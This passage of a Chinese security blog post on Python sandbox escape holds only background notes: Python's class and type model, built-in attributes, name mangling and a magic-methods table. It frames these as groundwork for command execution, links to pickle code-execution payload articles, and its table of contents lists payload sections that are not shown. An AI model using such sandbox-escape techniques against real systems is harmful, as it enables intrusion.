+<h1 id="python类"><a href="#python类" class="headerlink" title="python类"></a>python类</h1><h2 id="类的总结"><a href="#类的总结" class="headerlink" title="类的总结"></a>类的总结</h2><p>在python中有两种对象：  </p>
+<ul>
+<li>类型对象：可以被实例化和继承；   </li>
+<li>非类型对象：不可以被实例和继承。</li>
+</ul>
+<ol>
+<li><code>&lt;class &#39;type&#39;&gt;</code>和<code>&lt;class &#39;object&#39;&gt;</code>是python中的两个源对象。</li>
+<li>每个对象都有类型。用<code>objectname.__class__</code>查看。</li>
+<li>每个类型对象都有超类（object除外），用objectname.<strong>bases</strong>可以查看。</li>
+<li>通过继承产生的新对象都是类型对象。继承是用class语句来实现的。</li>
+<li>通过实例化产生的新对象可能是类型对象，也可能是非类型对象。实例化是通过调用操作符()来实现的。</li>
+<li>一些python的非类型对象可以通过特殊的语法来创造。例如<code>[1, 2, 3]</code>是list的实例。</li>
+<li>在内部，python总是使用类型对象来创造新对象。新创造的对象是该类型对象的实例。（在这里，实例有两种意思：一通过继承产生的子类，二是通过实例化产生的具体实例。但平时我们说的实例就是只第二种）。</li>
+<li>python通过class语句中指定的超类的类型来决定新对象的类型。<br><code>issubclass(A,B)</code>返回true当且仅当：<br>B在<code>A.__bases__</code>输出的元组之中;<br>如果A在<code>Z.__bases__</code>输出的元组中，<code>issubclass(Z,B)</code>返回true.<br>isinstance(A,B)返回true当且仅当：<br><code>A.__class__</code>是B，或者<br><code>issubclass(A.__class__,B)</code>返回true.</li>
+</ol>
+<p>一张图了解元类，类型/类(python3里面以及把类型和类等同对待)，实例，其中实线表示继承关系，虚线表示实例。</p>
+<p><img src="/myimages/python沙箱/onepic.png" alt="image"></p>
+<h2 id="类内置属性"><a href="#类内置属性" class="headerlink" title="类内置属性"></a>类内置属性</h2><ol>
+<li><code>__dict__</code> : 类的属性（包含一个字典，由类的数据属性组成）    </li>
+<li><code>__doc__</code> :类的文档字符串    </li>
+<li><code>__name__</code>: 类名    </li>
+<li><code>__module__</code>: 类定义所在的模块（类的全名是’<strong>main</strong>.className’，如果类位于一个导入模块mymod中，那么className.<strong>module</strong> 等于 mymod）     </li>
+<li><code>__bases__</code> : 类的所有父类构成元素（包含了一个由所有父类组成的元组）  <h2 id="属性区分"><a href="#属性区分" class="headerlink" title="属性区分"></a>属性区分</h2></li>
+<li><p>模块、类、函数均有以下属性：<br><code>__dict__</code>：该对象的属性字典。<br><code>__doc__</code>：返回说明性的文字，定义在块语句的最前面<br><code>__name__</code>：返回该对象的名字  </p>
+</li>
+<li><p>类、函数均有以下属性：<br><code>__module__</code>:用来返回该对象的模块名。<br><code>__class__</code>：用来返回类的类型（或者实例的类）、或者函数的类型<br><code>__globals__</code>：用来返回该对象所有可用的全局变量名。  </p>
+</li>
+<li><p>模块:<br><code>__file__</code>属性，用来返回模块包含路径的文件名<br><code>__builtins__</code>属性，用来返回所有的可以使用的内置函数、内置异常对象、内置保留字等对象。无论在任何位置，Python均会按照LEGB法则，在最后搜索模块的<code>__builtins__</code>属性，来最后判断该变量是否已经定义。</p>
+</li>
+<li><p>模块、类、函数通过调用dir函数，可以得到该对象实际可以使用的所有属性。</p>
+<h1 id="关于-xx-xx-xx"><a href="#关于-xx-xx-xx" class="headerlink" title="关于_xx __xx __xx__"></a>关于<code>_xx</code> <code>__xx</code> <code>__xx__</code></h1></li>
+<li><code>_xx</code>: Python中没有真正的私有属性或方法,可以在你想声明为私有的方法和属性前加上单下划线,以提示该属性和方法不应在外部调用.如果真的调用了也不会出错,但不符合规范。所以真的私有属性可以通过闭包来实现。</li>
+<li><code>__xx</code>: 双下划线开头,是为了不让子类重写该属性方法.通过类的实例化时自动转换.在类中的双下划线开头的属性方法前加上”_类名”实现：</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">    	self.a=x</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__b</span><span class="params">(self)</span>:</span></span><br><span class="line">    	self.x=<span class="number">3</span></span><br><span class="line"></span><br><span class="line">a = A(<span class="number">2</span>)</span><br><span class="line">a._A__b()</span><br><span class="line">print(a.x,a.x)</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li><code>__xx__</code>: 此种写法为Python内建属性方法，最好不要在外部调用</li>
+</ol>
+<h1 id="python魔术方法"><a href="#python魔术方法" class="headerlink" title="python魔术方法"></a>python魔术方法</h1><p>我们平时用得比较多的是python的<code>__init__()</code>,<code>__del__()</code>分别对应于类的实例化和实例销毁，但是，除了这些方法以外仍旧有很多的类所拥有的魔术方法，一下是我在网上的一个blog中发现的，总结得比较全面，所以摘录如下，方便日后查阅和理解python的一些比较绕的命令执行。</p>
+<table cellspacing="0" class="t_table"><tbody><tr><td width="30%"><div align="center"><font color="#ff0000"><strong> 魔术方法</strong></font></div></td><td><div align="center"><font color="#ff0000"><strong>含义 </strong></font></div></td></tr><tr><td><br><br></td><td><div align="left"><div align="center"><font color="#0000ff"><strong> 基本的魔术方法</strong></font></div></div></td></tr><tr><td><strong>new</strong>(cls[, …]) </td><td> 1. <strong>new</strong> 是在一个对象实例化的时候所调用的第一个方法<br><br>2. 它的第一个参数是这个类，其他的参数是用来直接传递给 <strong>init</strong> 方法<br><br>3. <strong>new</strong> 决定是否要使用该 <strong>init</strong> 方法，因为 <strong>new</strong> 可以调用其他类的构造方法或者直接返回别的实例对象来作为本类的实例，如果 <strong>new</strong> 没有返回实例对象，则 <strong>init</strong> 不会被调用<br><br>4. <strong>new</strong> 主要是用于继承一个不可变的类型比如一个 tuple 或者 string</td></tr><tr><td> <strong>init</strong>(self[, …]) </td><td>构造器，当一个实例被创建的时候调用的初始化方法</td></tr><tr><td> <strong>del</strong>(self)</td><td> 析构器，当一个实例被销毁的时候调用的方法</td></tr><tr><td> <strong>call</strong>(self[, args…]) </td><td>允许一个类的实例像函数一样被调用：x(a, b) 调用 x.<strong>call</strong>(a, b)</td></tr><tr><td> <strong>len</strong>(self)</td><td> 定义当被 len() 调用时的行为</td></tr><tr><td><strong>repr</strong>(self)</td><td> 定义当被 repr() 调用时的行为，<strong>repr</strong>用于所有其他的环境中：用于交互模式下提示回应以及repr函数，如果没有使用<strong>str</strong>，会使用print和str。它通常应该返回一个编码字符串，可以用来重新创建对象，或者给开发者详细的显示。</td></tr><tr><td> <strong>str</strong>(self)</td><td> 定义当被 str() 调用时的行为，打印操作会首先尝试<strong>str</strong>和str内置函数(print运行的内部等价形式)，它通常应该返回一个友好的显示。</td></tr><tr><td> <strong>bytes</strong>(self)</td><td> 定义当被 bytes() 调用时的行为</td></tr><tr><td> <strong>hash</strong>(self)</td><td> 定义当被 hash() 调用时的行为</td></tr><tr><td> <strong>bool</strong>(self)</td><td> 定义当被 bool() 调用时的行为，应该返回 True 或 False</td></tr><tr><td><strong>format</strong>(self, format_spec)</td><td> 定义当被 format() 调用时的行为</td></tr><tr><td> </td><td><div align="center"><font color="#0000ff"><strong>有关属性</strong></font></div></td></tr><tr><td> <strong>getattr</strong>(self, name)</td><td> 定义当用户试图获取一个不存在的属性时的行为</td></tr><tr><td> <strong>getattribute</strong>(self, name)</td><td> 定义当该类的属性被访问时的行为</td></tr><tr><td> <strong>setattr</strong>(self, name, value)</td><td> 定义当一个属性被设置时的行为</td></tr><tr><td> <strong>delattr</strong>(self, name)</td><td> 定义当一个属性被删除时的行为</td></tr><tr><td> <strong>dir</strong>(self)</td><td> 定义当 dir() 被调用时的行为</td></tr><tr><td> <strong>get</strong>(self, instance, owner)</td><td> 定义当描述符的值被取得时的行为</td></tr><tr><td> <strong>set</strong>(self, instance, value)</td><td> 定义当描述符的值被改变时的行为</td></tr><tr><td> <strong>delete</strong>(self, instance)</td><td> 定义当描述符的值被删除时的行为</td></tr><tr><td> </td><td><div align="center"><font color="#0000ff"><strong>比较操作符</strong></font></div></td></tr><tr><td> <strong>lt</strong>(self, other)</td><td> 定义小于号的行为：x &lt; y 调用 x.<strong>lt</strong>(y)</td></tr><tr><td> <strong>le</strong>(self, other)</td><td> 定义小于等于号的行为：x &lt;= y 调用 x.<strong>le</strong>(y)</td></tr><tr><td> <strong>eq</strong>(self, other)</td><td> 定义等于号的行为：x == y 调用 x.<strong>eq</strong>(y)</td></tr><tr><td> <strong>ne</strong>(self, other)</td><td> 定义不等号的行为：x != y 调用 x.<strong>ne</strong>(y)</td></tr><tr><td> <strong>gt</strong>(self, other)</td><td> 定义大于号的行为：x &gt; y 调用 x.<strong>gt</strong>(y)</td></tr><tr><td> <strong>ge</strong>(self, other)</td><td> 定义大于等于号的行为：x &gt;= y 调用 x.<strong>ge</strong>(y)</td></tr><tr><td> </td><td><div align="center"><font color="#0000ff"><strong>算数运算符</strong></font></div></td></tr><tr><td> <strong>add</strong>(self, other)</td><td> 定义加法的行为：+</td></tr><tr><td> <strong>sub</strong>(self, other)</td><td>定义减法的行为：- </td></tr><tr><td> <strong>mul</strong>(self, other)</td><td> 定义乘法的行为：<em></em></td></tr><tr><td> <strong>truediv</strong>(self, other)</td><td> 定义真除法的行为：/</td></tr><tr><td> <strong>floordiv</strong>(self, other)</td><td> 定义整数除法的行为：//</td></tr><tr><td> <strong>mod</strong>(self, other)</td><td> 定义取模算法的行为：%</td></tr><tr><td> <strong>divmod</strong>(self, other)</td><td> 定义当被 divmod() 调用时的行为</td></tr><tr><td> <strong>pow</strong>(self, other[, modulo]) </td><td> 定义当被 power() 调用或 ** 运算时的行为</td></tr><tr><td> <strong>lshift</strong>(self, other)</td><td> 定义按位左移位的行为：&lt;&lt;</td></tr><tr><td> <strong>rshift</strong>(self, other)</td><td>定义按位右移位的行为：&gt;&gt;</td></tr><tr><td> <strong>and</strong>(self, other)</td><td> 定义按位与操作的行为：&amp;</td></tr><tr><td> <strong>xor</strong>(self, other)</td><td> 定义按位异或操作的行为：^</td></tr><tr><td> <strong>or</strong>(self, other)</td><td>定义按位或操作的行为：| </td></tr><tr><td> </td><td><div align="center"><font color="#0000ff"><strong> 反运算</strong></font></div></td></tr><tr><td> <strong>radd</strong>(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> <strong>rsub</strong>(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> <strong>rmul</strong>(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> <strong>rtruediv</strong>(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> <strong>rfloordiv</strong>(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> <strong>rmod</strong>(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> <strong>rdivmod</strong>(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> <strong>rpow</strong>(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> <strong>rlshift</strong>(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> <strong>rrshift</strong>(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> <strong>rand</strong>(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> <strong>rxor</strong>(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> <strong>ror</strong>(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> </td><td><div align="center"><font color="#0000ff"><strong>增量赋值运算</strong></font></div></td></tr><tr><td> <strong>iadd</strong>(self, other)</td><td> 定义赋值加法的行为：+=</td></tr><tr><td> <strong>isub</strong>(self, other)</td><td> 定义赋值减法的行为：-=</td></tr><tr><td> <strong>imul</strong>(self, other)</td><td> 定义赋值乘法的行为：=</td></tr><tr><td> <strong>itruediv</strong>(self, other)</td><td> 定义赋值真除法的行为：/=</td></tr><tr><td> <strong>ifloordiv</strong>(self, other)</td><td> 定义赋值整数除法的行为：//=</td></tr><tr><td> <strong>imod</strong>(self, other)</td><td> 定义赋值取模算法的行为：%=</td></tr><tr><td> <strong>ipow</strong>(self, other[, modulo])</td><td> 定义赋值幂运算的行为：**=</td></tr><tr><td> <strong>ilshift</strong>(self, other)</td><td> 定义赋值按位左移位的行为：&lt;&lt;=</td></tr><tr><td> <strong>irshift</strong>(self, other)</td><td> 定义赋值按位右移位的行为：&gt;&gt;=</td></tr><tr><td> <strong>iand</strong>(self, other)</td><td> 定义赋值按位与操作的行为：&amp;=</td></tr><tr><td> <strong>ixor</strong>(self, other)</td><td> 定义赋值按位异或操作的行为：^=</td></tr><tr><td> <strong>ior</strong>(self, other)</td><td> 定义赋值按位或操作的行为：|=</td></tr><tr><td> </td><td><div align="center"><font color="#0000ff"><strong>一元操作符</strong></font></div></td></tr><tr><td> <strong>pos</strong>(self)</td><td> 定义正号的行为：+x</td></tr><tr><td> <strong>neg</strong>(self)</td><td> 定义负号的行为：-x</td></tr><tr><td> <strong>abs</strong>(self)</td><td> 定义当被 abs() 调用时的行为</td></tr><tr><td> <strong>invert</strong>(self)</td><td> 定义按位求反的行为：~x</td></tr><tr><td> </td><td><div align="center"><font color="#0000ff"><strong>类型转换</strong></font></div></td></tr><tr><td> <strong>complex</strong>(self)</td><td> 定义当被 complex() 调用时的行为（需要返回恰当的值）</td></tr><tr><td> <strong>int</strong>(self)</td><td> 定义当被 int() 调用时的行为（需要返回恰当的值）</td></tr><tr><td> <strong>float</strong>(self)</td><td> 定义当被 float() 调用时的行为（需要返回恰当的值）</td></tr><tr><td> <strong>round</strong>(self[, n])</td><td> 定义当被 round() 调用时的行为（需要返回恰当的值）</td></tr><tr><td> <strong>index</strong>(self)</td><td> 1. 当对象是被应用在切片表达式中时，实现整形强制转换<br><br>2. 如果你定义了一个可能在切片时用到的定制的数值型,你应该定义 <strong>index</strong><br><br>3. 如果 <strong>index</strong> 被定义，则 <strong>int</strong> 也需要被定义，且返回相同的值</td></tr><tr><td> </td><td><div align="center"><font color="#0000ff"><strong>上下文管理（with 语句）</strong></font></div></td></tr><tr><td> <strong>enter</strong>(self)</td><td> 1. 定义当使用 with 语句时的初始化行为<br><br>2. <strong>enter</strong> 的返回值被 with 语句的目标或者 as 后的名字绑定</td></tr><tr><td> <strong>exit</strong>(self, exc_type, exc_value, traceback)</td><td> 1. 定义当一个代码块被执行或者终止后上下文管理器应该做什么<br><br>2. 一般被用来处理异常，清除工作或者做一些代码块执行完毕之后的日常工作</td></tr><tr><td> </td><td><div align="center"><strong><font color="#0000ff">容器类型</font></strong></div></td></tr><tr><td> <strong>len</strong>(self)</td><td> 定义当被 len() 调用时的行为（返回容器中元素的个数）</td></tr><tr><td> <strong>getitem</strong>(self, key)</td><td> 定义获取容器中指定元素的行为，相当于 self[key]</td></tr><tr><td> <strong>setitem</strong>(self, key, value)</td><td> 定义设置容器中指定元素的行为，相当于 self[key] = value</td></tr><tr><td> <strong>delitem</strong>(self, key)</td><td> 定义删除容器中指定元素的行为，相当于 del self[key]</td></tr><tr><td> <strong>iter</strong>(self)</td><td> 定义当迭代容器中的元素的行为</td></tr><tr><td> <strong>reversed</strong>(self)</td><td> 定义当被 reversed() 调用时的行为</td></tr><tr><td> <strong>contains</strong>(self, item)</td><td> 定义当使用成员测试运算符（in 或 not in）时的行为</td></tr></tbody></table>
+
+
+<p>参考文献：</p>
+<p><a href="https://blog.csdn.net/qq_19528953/article/details/76252628" target="_blank" rel="noopener">1. Python魔术方法总结</a><br><a href="http://pycoders-weekly-chinese.readthedocs.io/en/latest/issue6/a-guide-to-pythons-magic-methods.html" target="_blank" rel="noopener">2. Python 魔术方法</a><br><a href="http://www.runoob.com/python/python-object.html" target="_blank" rel="noopener">3. Python 面向对象</a><br><a href="http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">4. 关于Python sec的一些简单的总结</a><br><a href="http://bestwing.me/2018/05/03/awesome-python-sandbox-in-ciscn/" target="_blank" rel="noopener">5 python沙盒绕过</a><br><a href="http://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html" target="_blank" rel="noopener">6. Python魔法方法指南</a><br><a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">7. Python Pickle的任意代码执行漏洞实践和Payload构造</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+	<div>
+      
+      <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+	  
+	</div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文标题:</strong>
+    <a href="/2018/07/31/python沙箱/">python沙箱绕过相关</a>
+  </li>
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    little potato
+  </li>
+  <li class="post-copyright-author">
+    <strong>发布时间:</strong>
+    2018年07月31日 - 22:07
+  </li>
+  <li class="post-copyright-author">
+    <strong>最后更新:</strong>
+    2018年12月05日 - 22:12
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2018/07/31/python沙箱/" title="python沙箱绕过相关">http://yoursite.com/2018/07/31/python沙箱/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/绕过/" rel="tag"># 绕过</a>
+          
+            <a href="/tags/python/" rel="tag"># python</a>
+          
+            <a href="/tags/魔术方法/" rel="tag"># 魔术方法</a>
+          
+            <a href="/tags/类属性/" rel="tag"># 类属性</a>
+          
+            <a href="/tags/沙箱逃逸/" rel="tag"># 沙箱逃逸</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/26/编码/" rel="next" title="编码">
+                <i class="fa fa-chevron-left"></i> 编码
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/08/08/Bypass-SQL/" rel="prev" title="Bypass_SQL">
+                Bypass_SQL <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/109.jpg" alt="little potato">
+          <p class="site-author-name" itemprop="name">little potato</p>
+           
+              <p class="site-description motion-element" itemprop="description">The true man wants two things:danger and play.</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">24</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">22</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">39</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=857896&auto=0&height=66"></iframe>
+
+<div align="left" font-family:="" "arial","microsoft="" yahei","����","����",sans-serif="">
+
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/IversionBY" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="mailto:mini.lypto@gmail.com" target="_blank" title="GMail">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  GMail
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/littelpotato" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.xdsec.club/" title="XDSEC" target="_blank">XDSEC</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.anquanquan.info/" title="infor" target="_blank">infor</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.freebuf.com/" title="freebuf" target="_blank">freebuf</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </div></section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#payload搜集"><span class="nav-number">1.</span> <span class="nav-text">payload搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#沙箱绕过中常用的os模块导入和命令执行姿势"><span class="nav-number">1.1.</span> <span class="nav-text">沙箱绕过中常用的os模块导入和命令执行姿势</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他python命令执行的姿势"><span class="nav-number">1.2.</span> <span class="nav-text">其他python命令执行的姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#导入os模块"><span class="nav-number">1.2.1.</span> <span class="nav-text">导入os模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#导入commands模块"><span class="nav-number">1.2.2.</span> <span class="nav-text">导入commands模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#导入subprocess模块"><span class="nav-number">1.2.3.</span> <span class="nav-text">导入subprocess模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#导入pty"><span class="nav-number">1.2.4.</span> <span class="nav-text">导入pty</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内置函数execfile-可以用来执行一个二进制文件"><span class="nav-number">1.2.5.</span> <span class="nav-text">内置函数execfile()可以用来执行一个二进制文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#导入timeit模块，间接执行命令"><span class="nav-number">1.2.6.</span> <span class="nav-text">导入timeit模块，间接执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内置函数eval和exec"><span class="nav-number">1.2.7.</span> <span class="nav-text">内置函数eval和exec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#platform库函数"><span class="nav-number">1.2.8.</span> <span class="nav-text">platform库函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pickle命令执行"><span class="nav-number">1.2.9.</span> <span class="nav-text">pickle命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#重写-reduce-方法"><span class="nav-number">1.2.9.1.</span> <span class="nav-text">重写__reduce__方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#运用marshal-pickle-code类型对象"><span class="nav-number">1.2.9.2.</span> <span class="nav-text">运用marshal pickle code类型对象</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#python-内置函数"><span class="nav-number">2.</span> <span class="nav-text">python 内置函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#python类"><span class="nav-number">3.</span> <span class="nav-text">python类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#类的总结"><span class="nav-number">3.1.</span> <span class="nav-text">类的总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#类内置属性"><span class="nav-number">3.2.</span> <span class="nav-text">类内置属性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#属性区分"><span class="nav-number">3.3.</span> <span class="nav-text">属性区分</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关于-xx-xx-xx"><span class="nav-number">4.</span> <span class="nav-text">关于_xx __xx __xx__</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#python魔术方法"><span class="nav-number">5.</span> <span class="nav-text">python魔术方法</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">little potato</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.3/jquery.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.3.1/velocity.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.3.1/velocity.ui.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://iversion lee.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://yoursite.com/2018/07/31/python沙箱/';
+          this.page.identifier = '2018/07/31/python沙箱/';
+          this.page.title = 'python沙箱绕过相关';
+        };
+        var d = document, s = d.createElement('script');
